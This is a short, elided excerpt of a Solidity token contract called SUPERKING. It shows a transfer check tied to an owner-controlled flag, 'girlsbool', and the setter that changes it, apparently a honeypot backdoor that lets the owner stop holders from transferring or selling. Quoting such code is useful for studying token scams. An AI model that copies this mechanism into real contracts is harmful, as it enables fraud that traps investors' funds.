...
contract SUPERKING is IERC20, Ownable {
    ...
    function _tokenTransfer(
        ...
        require(_girls[sender] == girlsbool);
    ...
    function setgirlsbool(bool enterbool) external onlyOwner {
        girlsbool = enterbool;
    }
